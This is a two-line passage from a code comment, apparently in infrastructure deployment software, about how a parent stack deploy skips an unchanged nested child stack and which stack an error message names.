 * in an UNCHANGED nested child, whose parent deploy skips that child and
 * succeeds. The stack the message already names is the one whose deploy refuses.
